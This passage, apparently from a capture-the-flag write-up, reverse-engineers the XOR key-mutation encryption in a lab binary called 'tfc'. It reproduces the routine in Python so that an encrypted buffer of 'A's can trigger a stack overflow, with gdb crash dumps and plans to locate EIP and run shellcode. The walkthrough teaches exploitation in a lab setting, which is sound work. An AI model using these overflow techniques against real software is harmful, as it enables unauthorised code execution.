</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
</span><span class='line'>ECX: 0xffffffc8
</span><span class='line'>EDX: 0x9 <span class="o">(</span><span class="s1">&#39;\t&#39;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0xc55193b
</span><span class='line'>ESP: 0xbffff3c0 <span class="o">(</span><span class="s2">&quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&quot;</span>...<span class="o">)</span>
</span><span class='line'>EIP: 0x675c916
</span><span class='line'>EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x675c916
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff3c0 <span class="o">(</span><span class="s2">&quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&quot;</span>...<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff3c4 --&gt; 0x5e43a802
</span><span class='line'>0008<span class="p">|</span> 0xbffff3c8 --&gt; 0x3d9cc67a
</span><span class='line'>0012<span class="p">|</span> 0xbffff3cc --&gt; 0x4050608c
</span><span class='line'>0016<span class="p">|</span> 0xbffff3d0 <span class="o">(</span><span class="s2">&quot;JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&quot;l\311+\203˃&amp;\322t\217 &quot;</span>...<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff3d4 <span class="o">(</span><span class="s2">&quot;Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&quot;l\311+\203˃&amp;\322t\217 BG\202\006&quot;</span>...<span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff3d8 --&gt; 0x5489a33c
</span><span class='line'>0028<span class="p">|</span> 0xbffff3dc --&gt; 0x3997552a
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x0675c916 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ow. Ok, so we don&rsquo;t crash with a clean <em>0x41414141</em> as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.</p>

<h2>planning a exploit</h2>

<p>So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs <strong>after</strong> the encryption function (remember <code>xcrypt</code>?) has run and wants to write the output to file (this is an assumption though).</p>

<p>Ok. So. Make sure you focus now :)</p>

<p>We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our <em>A</em> buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our <em>A</em> buffer as we have just observed it crash before the output is written.</p>

<p>So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our <em>A</em> buffer long enough, then we can feed that to <code>tfc</code> and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering <code>tfc</code> had no security as part of the compilation, maybe execute some shell code on the stack.</p>

<p>Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in <code>xcrypt()</code> to get started. Something I have practically 0 experience in.</p>

<h2>reversing xcrypt()</h2>

<p><em>For this part, I have to give a <strong>big</strong> high five to <a href="https://twitter.com/recrudesce">@recrudesce</a> for helping me understand parts of the pseudo code.</em></p>

<p>Right. Essentially, in order for us to better understand what exactly is happening within <code>xcrypt()</code>, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its <em>reaaaaaly</em> hard to comprehend), but it <em>really</em> helps in getting the mind to understand the flow.</p>

<p>For the pseudo code, I downloaded a demo version of <a href="http://www.hopperapp.com/">Hopper</a>. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded <code>tfc</code>, located the <code>xcrypt()</code> function and slapped the Pseudo code generation button:</p>

<p><img src="https://i.imgur.com/VPUDXvo.png"></p>

<p>While looking around for pseudo code generation options, I came across the <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a> online service, which had the following image as a control flow graph for the calls in <code>xcrypt()</code>.</p>

<p><img src="https://i.imgur.com/cT7i3ob.png"></p>

<p>Armed this this graph and the pseudo code, I was ready to start writing a python version of it.</p>

<p>I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="kt">int</span> <span class="n">arg0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">arg1</span><span class="p">)</span> <span class="p">{</span>
</span></code></pre></td></tr></table></div></figure>


<p>We start by declaring the fuction <code>xcrypt()</code>. <code>xcrypt()</code> takes 2 arguments. From inspecting the the parent function <code>cryptFile()</code> that calls <code>xcrypt()</code>, we can see the 2 arguments passed to <code>xcrypt()</code> is the file content and the length of the content respectively. So, <code>arg0</code> is the content and <code>arg1</code> is the content length.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">var_C</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span><span class="p">;</span>
</span><span class='line'><span class="n">var_10</span> <span class="o">=</span> <span class="n">arg_0</span><span class="p">;</span>
</span><span class='line'><span class="n">var_4</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we have 3 variable assignments occur. <code>var_C</code> is set to <code>0xea1ab19f</code>, <code>var_10</code> is set to the file content from <code>arg0</code> and <code>var_4</code> is set to 0.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">while</span> <span class="p">(</span><span class="n">arg_4</span> <span class="o">&gt;&gt;</span> <span class="mh">0x2</span> <span class="o">&gt;</span> <span class="n">var_4</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="p">(</span><span class="n">var_4</span> <span class="o">*</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="n">var_10</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">var_10</span> <span class="o">+</span> <span class="n">var_4</span> <span class="o">*</span> <span class="mh">0x4</span><span class="p">)</span> <span class="o">^</span> <span class="n">var_C</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This part has one bit that may be very confusing. Comparing this to other output from say IDA and <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a>, we will see that the <code>arg_4</code> referred to here is actually the length of the content, so <code>arg1</code> then.</p>

<p>With that out the way, we see the start of a while loop for <code>arg_4 &gt;&gt; 0x2</code>, which translates to <code>len(content) &gt;&gt; 2</code>, which essentially just means <code>len(content) / 4</code>. While the output of this bitwise right shift is larger than <code>var_4</code>, which is 0 at the start, the loop will continue.</p>

<p>Once inside the loop (and this is the part that for me was the hardest!!!) we see the line <code>*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</code>. What helped me understand what is going on here was to understand that <code>var_10</code> (which is the content of our file) is being passed by reference. So, <code>var_4 * 4</code> is essentially <code>i*4</code> of the contents, or <code>content[i*4]</code> in python, which is the 4 bytes from <code>var_4</code>. These 4 bytes are being xored by <code>var_C</code>, replacing the original 4 bytes in <code>var_10</code>, to the new xored ones.</p>

<p>So what can we deduce then? The hardcoded base encryption key for <code>tfc</code> is <code>0xea1ab19f</code>. Cool eh! But ok lets move on.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>        <span class="n">var_8</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'>        <span class="k">while</span> <span class="p">(</span><span class="n">var_8</span> <span class="o">&lt;=</span> <span class="mh">0x7</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">((</span><span class="n">var_C</span> <span class="o">&amp;</span> <span class="mh">0x1</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                        <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>                        <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span><span class="p">;</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                        <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="n">var_8</span> <span class="o">=</span> <span class="n">var_8</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="n">var_4</span> <span class="o">=</span> <span class="n">var_4</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from <code>while (0x0 &lt;= 0x7) {</code>.</p>

<p>Once the loop has started, we see a bitwise <code>and</code> occur that checks if the key (<code>var_C</code>) &amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with <code>0x6daa1cf4</code>. Why <code>0x6daa1cf4</code>? Well, should the key ever become <code>1111 1111 1111 1111</code> (in binary), then any bitshifts will have no effect. If the <code>and</code> does not result in 0, just shift the bits.</p>

<p>This occurs for 8 runs.</p>

<p>So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.</p>

<p>Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.</p>

<p>That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">var_14</span> <span class="o">=</span> <span class="n">arg_4</span> <span class="o">&amp;</span> <span class="mh">0xfffffffc</span><span class="p">;</span>
</span><span class='line'><span class="n">var_4</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'><span class="k">while</span> <span class="p">((</span><span class="n">arg_4</span> <span class="o">&amp;</span> <span class="mh">0x3</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">var_4</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="n">var_14</span> <span class="o">+</span> <span class="n">var_4</span><span class="p">)</span> <span class="o">=</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">var_C</span> <span class="o">^</span> <span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="n">var_14</span> <span class="o">+</span> <span class="n">var_4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
</span><span class='line'>        <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">&gt;&gt;</span> <span class="mh">0x8</span><span class="p">;</span>
</span><span class='line'>        <span class="n">var_4</span> <span class="o">=</span> <span class="n">var_4</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">return</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>the encryption logic replicated</h2>

<p>While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Hopper Pseudo Code</span>
</span><span class='line'>
</span><span class='line'><span class="c"># int xcrypt(int arg0, int arg1) {</span>
</span><span class='line'><span class="c">#     var_C = 0xea1ab19f;</span>
</span><span class='line'><span class="c">#     var_10 = arg_0;</span>
</span><span class='line'><span class="c">#     var_4 = 0x0;</span>
</span><span class='line'><span class="c">#     while (arg_4 &gt;&gt; 0x2 &gt; var_4) {</span>
</span><span class='line'><span class="c">#             *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</span>
</span><span class='line'><span class="c">#             var_8 = 0x0;</span>
</span><span class='line'><span class="c">#             while (var_8 &lt;= 0x7) {</span>
</span><span class='line'><span class="c">#                     if ((var_C &amp; 0x1) != 0x0) {</span>
</span><span class='line'><span class="c">#                             var_C = var_C &gt;&gt; 0x1;</span>
</span><span class='line'><span class="c">#                             var_C = var_C ^ 0x6daa1cf4;</span>
</span><span class='line'><span class="c">#                     }</span>
</span><span class='line'><span class="c">#                     else {</span>
</span><span class='line'><span class="c">#                             var_C = var_C &gt;&gt; 0x1;</span>
</span><span class='line'><span class="c">#                     }</span>
</span><span class='line'><span class="c">#                     var_8 = var_8 + 0x1;</span>
</span><span class='line'><span class="c">#             }</span>
</span><span class='line'><span class="c">#             var_4 = var_4 + 0x1;</span>
</span><span class='line'><span class="c">#     }</span>
</span><span class='line'><span class="c">#     var_14 = arg_4 &amp; 0xfffffffc;</span>
</span><span class='line'><span class="c">#     var_4 = 0x0;</span>
</span><span class='line'><span class="c">#     while ((arg_4 &amp; 0x3) &gt; var_4) {</span>
</span><span class='line'><span class="c">#             *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp; 0xff);</span>
</span><span class='line'><span class="c">#             var_C = var_C &gt;&gt; 0x8;</span>
</span><span class='line'><span class="c">#             var_4 = var_4 + 0x1;</span>
</span><span class='line'><span class="c">#     }</span>
</span><span class='line'><span class="c">#     return 0x0;</span>
</span><span class='line'><span class="c"># }</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">encrypted</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># set the base encryption key. this mutates with each pass</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span>    <span class="c"># var_C = 0xea1ab19f;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">):</span> <span class="c"># while (arg_4 &gt;&gt; 0x2 &gt; var_4) {</span>
</span><span class='line'>        <span class="c"># apply the encryption logic as can bee seen in</span>
</span><span class='line'>        <span class="c"># *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># grab the 4 bytes we working with</span>
</span><span class='line'>        <span class="nb">bytes</span> <span class="o">=</span> <span class="n">content</span><span class="p">[</span><span class="n">word</span><span class="o">*</span><span class="mi">4</span><span class="p">:((</span><span class="n">word</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mi">4</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># struct unpack_from returns a tuple, we want 0 so that</span>
</span><span class='line'>        <span class="c"># we end up with something we can xor</span>
</span><span class='line'>        <span class="n">long_to_xor</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># apply the xor, this is the actual encryption part</span>
</span><span class='line'>        <span class="n">encrypted_bytes</span> <span class="o">=</span> <span class="n">long_to_xor</span> <span class="o">^</span> <span class="n">key</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># append the 4 encrypted bytes by packing them</span>
</span><span class='line'>        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span><span class="n">encrypted_bytes</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># next we run the key mutation </span>
</span><span class='line'>        <span class="k">for</span> <span class="n">mutation</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>            <span class="c"># no mutation is possible of the key is 1111 1111 1111 1111</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">encrypted</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># set the content that we want to encrypt</span>
</span><span class='line'>    <span class="n">content</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span><span class="mi">1000</span>
</span><span class='line'>    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">encrypted</span>
</span></code></pre></td></tr></table></div></figure>


<h2>testing the script</h2>

<p>With the script done I obviously had to test it. I have a buffer of 1000 <em>A</em>&rsquo;s as the content and redirected the script output to a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; test.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# head test.tfc
</span><span class='line'>��<span class="o">[</span>�<span class="o">]</span>��C��dl�
</span><span class='line'>              H<span class="o">)</span>�Aotg�<span class="se">\!</span>�E?�̀l+�B��<span class="nv">$f5</span>%�<span class="p">&amp;</span>�y�<span class="p">|</span>S<span class="o">[</span>I<span class="p">;</span>R.�+T��w�<span class="nv">$͟</span>�7��?i�w<span class="err">&#39;</span>�3�s&lt;A��^��
</span><span class='line'>
</span><span class='line'>root@kali:~# ./tfc test.tfc out.tfc
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'>
</span><span class='line'>root@kali:~# head out.tfc
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></code></pre></td></tr></table></div></figure>


<p>So to recap. We generated a file <code>test.tfc</code>, which is the encrypted version of 1000 <em>A</em>&rsquo;s. We then ran it through <code>tfc</code> which decrypted it to our cleartext <em>A</em>&rsquo;s again.</p>

<h2>finding EIP</h2>

<p>With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of <code>41</code>&rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 <em>A</em>&rsquo;s, and ran it through <code>gdb</code> to be able to inspect the Segmentation Fault that occurs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; crash.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>r crash.tfc crash-out.tfc
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
</span><span class='line'>ECX: 0xffffffc8
